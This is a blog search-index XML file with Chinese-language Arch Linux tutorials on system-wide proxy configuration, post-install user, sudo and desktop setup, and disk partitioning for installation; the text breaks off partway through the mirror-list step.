<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ArchLinux代理</title>
    <url>/2020/12/11/ArchLinux%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="环境变量代理"><a href="#环境变量代理" class="headerlink" title="环境变量代理"></a>环境变量代理</h1><h2 id="普通代理"><a href="#普通代理" class="headerlink" title="普通代理"></a>普通代理</h2><p>要将代理环境变量提供给所有用户和所有应用程序，将命令添加到脚本中,如:<code>/etc/profile.d/proxy.sh</code>,然后脚本必须有可执行限。 当使用Xfce之类的桌面环境时，此方法很有用。 例如Xfce通过此方法设置的变量运行Chromium浏览器进行Chromium浏览器代理。</p>
<a id="more"></a>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> proxy=http://127.0.0.1:8080</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;<span class="variable">$proxy</span>&quot;</span> \</span><br><span class="line">       https_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       ftp_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       rsync_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       HTTP_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       HTTPS_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       FTP_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       RSYNC_PROXY=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> no_proxy=<span class="string">&quot;localhost,127.0.0.1,localaddress,.localdomain.com&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>curl</code> 和 <code>pacman</code> 代理</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<p><strong>另外，还有一个名为<code>proxyman-git</code>(AUR)的工具，可以轻松配置系统范围的代理设置。 它还处理<code>git</code>，<code>npm</code>，<code>Dropbox</code>等其他软件的代理配置。</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> 		代理服务器设置</span><br><span class="line">uset 		取消代理设置</span><br><span class="line">list 		列出当前设置</span><br><span class="line">configs 	列出可用的配置</span><br><span class="line">load 		加载配置文件</span><br><span class="line">delete 		删除个人资料</span><br><span class="line"><span class="built_in">help</span> 		显示此帮助</span><br></pre></td></tr></table></figure>
<p>配置文件位置<code>~/.config/proxyman/</code></p>
<p>例:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxyman <span class="built_in">set</span></span><br><span class="line"> Enter details to <span class="built_in">set</span> proxy</span><br><span class="line"> HTTP Proxy  Host 127.0.0.1</span><br><span class="line"> HTTP Proxy  Port 8889</span><br><span class="line"> Use auth - userid/password (y/n)? n</span><br><span class="line"> Use same <span class="keyword">for</span> HTTPS and FTP (y/n)? y</span><br><span class="line"> No Proxy  (default localhost,127.0.0.1,192.168.1.1,::1,*.<span class="built_in">local</span>)</span><br><span class="line">Save profile <span class="keyword">for</span> later use (y/n)? y</span><br><span class="line"> Enter profile name  : v2ray_http</span><br><span class="line">Saved to /home/eonun/.config/proxyman/v2ray_http.</span><br><span class="line"></span><br><span class="line"> Select targets to modify</span><br><span class="line">| 1 | All of them ... Don<span class="string">&#x27;t bother me</span></span><br><span class="line"><span class="string">| 2 | Terminal / bash / zsh (current user)</span></span><br><span class="line"><span class="string">| 3 | /etc/environment</span></span><br><span class="line"><span class="string">| 4 | apt/dnf (Package manager)</span></span><br><span class="line"><span class="string">| 5 | Desktop settings (GNOME/Ubuntu/KDE)</span></span><br><span class="line"><span class="string">| 6 | npm &amp; yarn</span></span><br><span class="line"><span class="string">| 7 | Dropbox</span></span><br><span class="line"><span class="string">| 8 | Git</span></span><br><span class="line"><span class="string">| 9 | Docker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Separate multiple choices with space</span></span><br><span class="line"><span class="string"> ? 1</span></span><br><span class="line"><span class="string">Setting proxy...</span></span><br><span class="line"><span class="string">To activate in current terminal window</span></span><br><span class="line"><span class="string">run source ~/.bashrc</span></span><br><span class="line"><span class="string">To activate in current terminal window</span></span><br><span class="line"><span class="string">run source ~/.zshrc</span></span><br><span class="line"><span class="string">Done</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h2 id="保持通过代理-sudo"><a href="#保持通过代理-sudo" class="headerlink" title="保持通过代理 sudo"></a>保持通过代理 <code>sudo</code></h2><p>将以下行添加到sudo配置文件<code>/etc/sudoers.d/05_proxy</code>中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Defaults env_keep +&#x3D; &quot;*_proxy *_PROXY&quot;</span><br></pre></td></tr></table></figure>
<h1 id="软件代理"><a href="#软件代理" class="headerlink" title="软件代理"></a>软件代理</h1><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>安装 <code>proxychains-ng</code> (既能代理socks,又能代理http),配置文件<code>/etc/proxychains.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># socks5</span><br><span class="line">socks5 127.0.0.1 8080</span><br><span class="line">socks4 127.0.0.1 9050</span><br><span class="line"></span><br><span class="line"># http</span><br><span class="line">http 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<p>使用 <code>proxychains xxxx</code> 通过代理运行程序 <code>xxxx</code> 。</p>
<h2 id="tsocks"><a href="#tsocks" class="headerlink" title="tsocks"></a>tsocks</h2><p>安装<code>tsocks</code>(只能代理socks),配置文件 <code>/etc/tsocks.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#x3D; 127.0.0.1</span><br><span class="line">server_port &#x3D; 8080</span><br><span class="line">server_type &#x3D; 5</span><br><span class="line">default_user &#x3D; &quot;&quot;</span><br><span class="line">default_pass &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>curl 和 pacman 代理</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=<span class="string">&quot;socks5://your.proxy:1080&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h1><p>浏览器可使用软件代理进行代理，也可用插件代理</p>
<p>Firefox 自带代理功能</p>
<p>Chromium 可安装插件 <code>SwitchyOmega</code> (<a href="https://github.com/FelisCatus/SwitchyOmega">GitHub官网</a>)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux安装后配置</title>
    <url>/2019/12/04/ArchLinux%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h1><p>有线网自动获取IP<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure></p>
<p>连接无线网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifi-menu</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>在linux上root就是上帝，能对系统进行任何操作，包括删除系统文件，所有使用root操作是很危险的，通常都是创建一个普通用户来使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m username</span><br></pre></td></tr></table></figure>
<p><code>-m</code>:创建用户的家目录<code>/home/username</code><br><code>username</code>:创建的用户名</p>
<h2 id="给用户设置密码"><a href="#给用户设置密码" class="headerlink" title="给用户设置密码"></a>给用户设置密码</h2><p>root具有上帝权限，所以无需验证任何用户的密码就能修改用户的密码，新建的用户还没有密码所以还无法登录(但root通过<code>su</code>命令能无密码登录)，所以需要给用户设置密码后用户才能登录</p>
<p>给<code>username</code>设置密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><br>连续输入两次密码回车即可（linux不显示密码的输入）</p>
<h1 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h1><p>创建了普通用户，但很多情况下需要用到root的权限怎么办呢?这就需要用到<code>sudo</code>来提权了</p>
<p>sudo 能临时赋予用户root的部分管理权限，达到使用root运行相关指令的目的,比如arch的包管理器<code>pacman</code>就需要root权限,也就是说安装软件就需要root权限</p>
<h2 id="安装sudo软件包"><a href="#安装sudo软件包" class="headerlink" title="安装sudo软件包:"></a>安装sudo软件包:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>
<p>若安装基础包时安装了<code>base-devel</code>包就无需安装了,<code>base-devel</code>软件包含有<code>sudo</code></p>
<p><strong>配置sudo</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /sudoers</span><br></pre></td></tr></table></figure></p>
<p>打开配置文件后找到<code>%wheel ALL=(ALL)ALL</code>，去掉注释<code>#</code>，重启<code>reboot</code>，给整个用户组权限</p>
<p>也可直接添加一条<code>username ALL=(ALL)ALL</code>给用户权限</p>
<h2 id="加入wheel用户组"><a href="#加入wheel用户组" class="headerlink" title="加入wheel用户组"></a>加入wheel用户组</h2><p>将用户加入whell用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -G wheel username</span><br></pre></td></tr></table></figure></p>
<p>wheel 组的概念继承自 UNIX，当需要进行一些高级维护时，往往要用到 root 权限；而wheel 组是一个包含特殊权限的用户组，用来满足需要 root 权限的需求。</p>
<p>对于服务器来说，我们希望只有属于 wheel 组的用户才可以用 <code>su</code> 登录 root。这样就进一步增强了系统的安全性。具体步骤如下：</p>
<ul>
<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到<code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code>，将行首的注释<code>#</code>去掉。</p>
</li>
<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加：<code>SU_WHEEL_ONLY yes</code>。</p>
</li>
</ul>
<p>然后，用<code>usermod -G wheel username</code> 将用户添加到 wheel 组中,这样被添加到 wheel 组的用户登录，就能执行 <code>su</code> 命令输入正确的 root 密码就可以正常的登录为 root 用户了。</p>
<h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><div class="table-container">
<table>
<thead>
<tr>
<th>品牌</th>
<th>驱动</th>
<th>驱动类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>AMD/ATI</td>
<td><code>xf86-video-amdgpu</code>、<code>xf86-video-ati</code></td>
<td>开源</td>
</tr>
<tr>
<td></td>
<td><code>catalyst</code>(AUR)</td>
<td>闭源</td>
</tr>
<tr>
<td>Intel</td>
<td><code>xf86-video-intel</code></td>
<td>开源</td>
</tr>
<tr>
<td>Nvidia</td>
<td><code>xf86-video-nonveau</code></td>
<td>开源</td>
</tr>
<tr>
<td></td>
<td><code>nvidia</code>、<code>nvidia-340xx</code>、<code>nvidia-304xx</code></td>
<td>闭源</td>
</tr>
</tbody>
</table>
</div>
<p>参照表格安装相应的驱动，通常安装集显的开源驱动就够用，若需要打点游戏，做点图什么的可以安装独立显卡的闭源驱动提升性能。<font color="ff0000"><strong>安装闭源驱动一定要查看wiki根据说明安装，不然可能回无法正常进入系统</strong></font></p>
<p>查看被识别的显卡:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci | grep -e VGA -e 3D</span><br></pre></td></tr></table></figure></p>
<p>搜索开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss xf86-video</span><br></pre></td></tr></table></figure></p>
<p>安装intel集显开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xf86-video-intel</span><br></pre></td></tr></table></figure></p>
<h2 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h2><p>Xorg是Linux下的一个著名的开源图形服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>
<h2 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h2><p>Linux下有很多著名的<a href="https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments">桌面环境</a>如：</p>
<ul>
<li>Xfce</li>
<li>KDE(Plasma)</li>
<li>Gnome</li>
<li>Unity</li>
<li>Deepin(深度的国产桌面环境)</li>
</ul>
<p>自行选择安装即可</p>
<p>如:</p>
<ul>
<li>Xfce :<code>sudo pacman -S xfce4 xfce4-goodies</code></li>
<li>KDE(Plasma):<code>sudo pacman -S plasma kde-application</code></li>
<li>Gnome:<code>sudo pacman -S gnome gnome-extra</code></li>
<li>Deepin:<code>sudo pacman -S deepin deepin-extra</code></li>
</ul>
<h2 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h2><p>安装好了桌面环境包以后，需要安装一个<a href="https://wiki.archlinux.org/index.php/Display_manager">桌面管理器</a>来帮助我们登录且选择使用的桌面环境</p>
<ul>
<li>LightDM : <code>sudo pacman -S lighdm</code></li>
<li>sddm : <code>sudo pacman -S sddm</code></li>
<li>GDM : <code>sudo pacman -S gdm</code></li>
</ul>
<p><strong>启动桌面管理器服务</strong></p>
<p>服务管理<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开机启动/关闭开启启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> xxxx</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动/停止服务</span></span><br><span class="line">sudo systemctl start xxxx</span><br><span class="line">sudo systemctl stop xxxx</span><br></pre></td></tr></table></figure></p>
<p>如设置开机启动<code>sddm</code>: <code>sudo systemctl enable sddm</code></p>
<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>之前用的一直是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以需要禁用netctl并启用NetworkManager</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager</span><br></pre></td></tr></table></figure>
<p>安装工具栏图标显示网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure></p>
<p><strong>重启电脑即可</strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux安装教程</title>
    <url>/2019/12/03/ArchLinux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  Arch Linux是当下最热门的Linux发行版之一，它提供简单、最小化且优雅的体验，Arch可通过自己的喜好定制属于自己的系统，这就带来了一个难题一切都得通过命令行手动定制(包括安装系统)，这对于初学Linux的人来说是不利的，所以不建议初学者安装Arch。<br><a id="more"></a><br>  Arch 优点：</p>
<pre><code>  - 可定制属于自己的Linux系统(与Gentoo几乎并列高定制榜首,只是Gentoo需要自己从内核开始编译安装软件，软件安装速度上没有Arch通过二进制包安装软件包的快)
- 没有预装
- Arch Wiki宝典能解决遇到的几乎所有问题(建议看英文版,中文很多都老旧且有错误，同样Gentoo Wiki也和Arch Wiki一样被视为Linux界的宝典)
- 滚动更新能让你的系统保持最新
- AUR万能仓库能找到几乎所有Linux的软件包(包括其他主流发行版的软件)
</code></pre><p>  Arch 缺点：</p>
<pre><code>  - 一且都从命令行开始,包括安装系统(如果不想从命令行开始可以考虑Manjaro linux入手)
- 只能通过联网安装
- 根动更新可能滚坏系统，但可以滚回去
</code></pre><p>  Arch Linux是一个非常优秀的发行版，优点多于缺点，对于非Linux用来说可能偏技术性，但只要肯投入时间和精力，善于使用Wiki，从零开始搭建完Arch并定制成属于自己的系统，你将掌握很多 GNU/Linux 的内容，相信自己一定能成为别人眼中的大神。</p>
<p>  (ps:其实Linux初学者才更应该从Arch入手，因为Arch Wiki是一本Linux宝典，基本上Linux的所有软件包如何配置，遇到问题如何解决都有详细的说明，同时一切都从命令行开始的Arch能让你更好的理解Linux系统)</p>
<h1 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h1><ul>
<li><p>使用U盘制作启动盘后从U盘进入Live环境,<a href="https://wiki.archlinux.org/index.php/Linux_console/Keyboard_configuration">键盘布局</a>默认为美式键盘映射</p>
</li>
<li><p>检查引导方式<br>现在主要的引导方式有EFI引导+GPT分区表和BIOS(或CSM)引导+MBR分区表两种,不同的主板配置不同。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>
<p>  如果存在，则可能是纯UEFI方式引导，如果目录不存在，系统可能以 BIOS 或 CSM（即UEFI的Legacy BIOS引导支持） 方式引导,具体查阅主板手册</p>
<ul>
<li><p>联网：<br>有线通过<code>dhcpcd</code>命令获取IP，<code>ping www.bing.com</code>检查网络是否通(Ctr-C终止)<br>无线网络使用<code>wifi-menu</code>命令通过字符UI连接无线网,<code>ping www.bing.com</code>检查网络是否通</p>
</li>
<li><p>更新系统时间:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><h2 id="建立分区并挂载"><a href="#建立分区并挂载" class="headerlink" title="建立分区并挂载"></a>建立分区并挂载</h2><p>列出被系统的磁盘块设备，可看到磁盘的基本信息<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></p>
<h3 id="BIOS-MBR方式引导"><a href="#BIOS-MBR方式引导" class="headerlink" title="BIOS/MBR方式引导"></a>BIOS/MBR方式引导</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">安装挂载点</th>
<th style="text-align:center">挂载点</th>
<th style="text-align:center">分区</th>
<th>分区类型</th>
<th style="text-align:center">建议大小</th>
<th style="text-align:center">格式化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/mnt</code></td>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center"><code>/dev/sdX1</code></td>
<td>Linux root (x86-64)</td>
<td style="text-align:center">23~32G</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center"><code>[SWAP]</code></td>
<td style="text-align:center"><code>/dev/sdX2</code></td>
<td>Linux swap</td>
<td style="text-align:center">大于512M</td>
<td style="text-align:center">-</td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt/home</code></td>
<td style="text-align:center"><code>/home</code></td>
<td style="text-align:center"><code>/dev/sdX3</code></td>
<td>Linux home</td>
<td style="text-align:center">剩余空间</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>sdX</strong>:<code>X</code>为磁盘号从a开始排，根据自己的硬盘替换</p>
<p><strong>[SWAP]</strong>:<strong>为交换空间分区，相当于虚拟内存，若不不创建该分区，系统将会以文件的形式保存</strong>,<a href="https://wiki.archlinux.org/index.php/Swap">具体参见</a></p>
<p><strong><font color="#ff0000">为了方便管理通常都是不使用分区形式的而是使用文件的形式，这就不过多赘述来，需要的请学会使用Wiki解决问题</font></strong></p>
<ul>
<li>SWAP的建议大小:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">物理内存(RAM)</th>
<th style="text-align:center">SWAP大小</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&lt; 4G</code></td>
<td style="text-align:center">2倍RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>4G</code>~<code>8G</code></td>
<td style="text-align:center">等于RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>8G</code>~<code>64G</code></td>
<td style="text-align:center"><code>8G</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt; 64G</code></td>
<td style="text-align:center"><code>16G</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="创建分区"><a href="#创建分区" class="headerlink" title="创建分区"></a>创建分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入磁盘分区工具</span></span><br><span class="line">fdisk /dev/sdX</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看磁盘分区信息: <strong><code>p</code></strong></p>
</li>
<li><p>创建MBR分区表:<strong><code>o</code></strong></p>
</li>
<li><p>创建新分区: <strong><code>n</code></strong></p>
<blockquote>
<p>设置分区号(默认) ==&gt; 设置分区起始(默认) ==&gt; 设置分区大小(如:<code>+512M</code>、<code>+32G</code>)</p>
</blockquote>
</li>
<li><p>设置分区类型:<strong><code>t</code></strong></p>
<blockquote>
<p>输入分区号选择分区 ==&gt; 查看支持的分区类型(L列出,上下键分页,q退出) ==&gt;  输入数字选择相应的类型修改</p>
</blockquote>
</li>
<li><p>删除分区:<strong><code>d</code></strong></p>
<blockquote>
<p>输入分区号删除</p>
</blockquote>
</li>
<li><p>获取帮助:<strong><code>m/help</code></strong></p>
</li>
<li><p>保存退出:<strong><code>w</code></strong></p>
</li>
<li><p>不保存退出:<strong><code>q</code></strong></p>
</li>
</ul>
<h4 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h4><p><strong>格式化交换分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /dev/sdXY</span><br><span class="line"></span><br><span class="line"><span class="comment">#启用swap</span></span><br><span class="line">swapon /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<p><strong>格式其他分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<font color="ff0000">**`X`、`Y`相应切换即可**</font>

<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><ul>
<li><p>根据<strong>安装挂载点</strong>挂载<strong><code>/</code></strong>分区</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdX1 /mnt/</span><br></pre></td></tr></table></figure>
</li>
<li><p>挂载其他分区(<font color="ff0000"><strong>一定要挂载<code>/</code>分区后再挂载其他分区,这样才能将挂载点创建在<code>/</code>分区上</strong></font>)</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建home分区挂载点</span></span><br><span class="line">mkdir /mnt/home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载home分区</span></span><br><span class="line">mount /dev/sdX3 /mnt/home</span><br></pre></td></tr></table></figure>
<h3 id="EFI-GPT方式引导"><a href="#EFI-GPT方式引导" class="headerlink" title="EFI/GPT方式引导"></a>EFI/GPT方式引导</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">安装挂载点</th>
<th style="text-align:center">挂载点</th>
<th style="text-align:center">分区</th>
<th>分区类型</th>
<th style="text-align:center">建议大小</th>
<th style="text-align:center">格式化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/mnt/boot</code></td>
<td style="text-align:center"><code>/boot</code></td>
<td style="text-align:center"><code>dev/sdX1</code></td>
<td>EFI System</td>
<td style="text-align:center">256~512M</td>
<td style="text-align:center"><code>FAT32</code></td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt</code></td>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center"><code>dev/sdX2</code></td>
<td>Linux root (x86-64)</td>
<td style="text-align:center">23~32G</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center"><code>[SWAP]</code></td>
<td style="text-align:center"><code>/dev/sdX3</code></td>
<td>Linux swap</td>
<td style="text-align:center">大于512M</td>
<td style="text-align:center">-</td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt/home</code></td>
<td style="text-align:center"><code>/home</code></td>
<td style="text-align:center"><code>dev/sdX4</code></td>
<td>Linux home</td>
<td style="text-align:center">剩余空间</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>sdX</strong>:<code>X</code>为磁盘号从a开始排，根据自己的硬盘替换</p>
<p><strong>[SWAP]</strong>:<strong>为交换空间分区，相当于虚拟内存，若不不创建该分区，系统将会以文件的形式保存</strong>,<a href="https://wiki.archlinux.org/index.php/Swap">具体参见</a></p>
<p><strong><font color="#ff0000">为了方便管理通常都是不使用分区形式的而是使用文件的形式，这就不过多赘述来，需要的请学会使用Wiki解决问题</font></strong></p>
<ul>
<li>SWAP的建议大小:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">物理内存(RAM)</th>
<th style="text-align:center">SWAP大小</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&lt; 4G</code></td>
<td style="text-align:center">2倍RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>4G</code>~<code>8G</code></td>
<td style="text-align:center">等于RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>8G</code>~<code>64G</code></td>
<td style="text-align:center"><code>8G</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt; 64G</code></td>
<td style="text-align:center"><code>16G</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="创建分区-1"><a href="#创建分区-1" class="headerlink" title="创建分区"></a>创建分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入磁盘分区工具</span></span><br><span class="line">fdisk /dev/sdX</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看磁盘分区信息: <strong><code>p</code></strong></p>
</li>
<li><p>创建GPT分区表:<strong><code>g</code></strong></p>
</li>
<li><p>创建新分区: <strong><code>n</code></strong></p>
</li>
</ul>
<blockquote>
<p>设置分区号(默认) ==&gt; 设置分区起始(默认) ==&gt; 设置分区大小(如:<code>+512M</code>、<code>+32G</code>)</p>
</blockquote>
<ul>
<li>设置分区类型:<strong><code>t</code></strong> </li>
</ul>
<p><strong><font color="ff000">一定要设置引导分区的类型</font></strong></p>
<blockquote>
<p>输入分区号选择分区 ==&gt; 查看支持的分区类型(L列出,上下键分页,q退出) ==&gt;  输入数字选择相应的类型修改</p>
</blockquote>
<ul>
<li>删除分区:<strong><code>d</code></strong></li>
</ul>
<blockquote>
<p>输入分区号删除</p>
</blockquote>
<ul>
<li><p>获取帮助:<strong><code>m/help</code></strong></p>
</li>
<li><p>保存退出:<strong><code>w</code></strong></p>
</li>
<li><p>不保存退出:<strong><code>q</code></strong></p>
</li>
</ul>
<h4 id="格式化分区-1"><a href="#格式化分区-1" class="headerlink" title="格式化分区"></a>格式化分区</h4><p><strong>格式化引导分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/sdXY</span><br></pre></td></tr></table></figure>
<p><strong>格式化交换分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /dev/sdXY</span><br><span class="line"></span><br><span class="line"><span class="comment">#启用swap</span></span><br><span class="line"></span><br><span class="line">swapon /dev/sdXY</span><br></pre></td></tr></table></figure>
<p><strong>格式其他分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<font color="ff0000">**`X`、`Y`相应切换即可**</font>



<h4 id="挂载分区-1"><a href="#挂载分区-1" class="headerlink" title="挂载分区"></a>挂载分区</h4><ul>
<li>根据安装挂载点<strong>挂载</strong><code>/</code>(根)分区</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdX2 /mnt/</span><br></pre></td></tr></table></figure>
<ul>
<li>挂载其他分区(<font color="ff0000"><strong>一定要挂载<code>/</code>分区后再挂载其他分区,这样才能将挂载点创建在<code>/</code>分区上</strong></font>)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建EFI分区挂载点</span></span><br><span class="line"></span><br><span class="line">mkdir /mnt/boot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载EFI分区</span></span><br><span class="line"></span><br><span class="line">mount /dev/sdX1 /mnt/boot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建home分区挂载点</span></span><br><span class="line"></span><br><span class="line">mkdir /mnt/home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载home分区</span></span><br><span class="line"></span><br><span class="line">mount /dev/sdX4 /mnt/home</span><br></pre></td></tr></table></figure>
<h2 id="优化镜像源"><a href="#优化镜像源" class="headerlink" title="优化镜像源"></a>优化镜像源</h2><p>  在<code>mirrorlist</code>文件中保存着所有的镜像源，但它的排序会导致国内的访问速度大大降低，我们需要将国内的更新源放到前面，使包管理器使用的是国内的源，从而加速。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<ul>
